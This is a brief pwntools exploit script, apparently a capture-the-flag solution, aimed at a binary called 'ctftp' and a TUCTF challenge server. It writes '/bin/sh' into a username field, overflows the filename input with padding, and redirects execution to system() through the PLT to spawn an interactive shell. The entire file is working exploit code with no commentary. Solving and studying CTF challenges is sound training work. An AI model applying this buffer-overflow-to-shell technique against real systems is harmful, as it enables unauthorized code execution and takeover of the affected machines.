from pwn import *

context.log_level='debug'
p = process('./ctftp')
elf = ELF('./ctftp',checksec=False)

#p = remote('chal.tuctf.com', 30500)


p.recvuntil('name: ')
p.sendline('/bin/sh')

p.recvuntil('> ')
p.sendline('2')

p.recvuntil('filename: ')
gdb.attach(p)
p.sendline('aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaa'+p32(elf.plt['system'])+p32(0)+p32(elf.symbols['username']))


p.interactive()
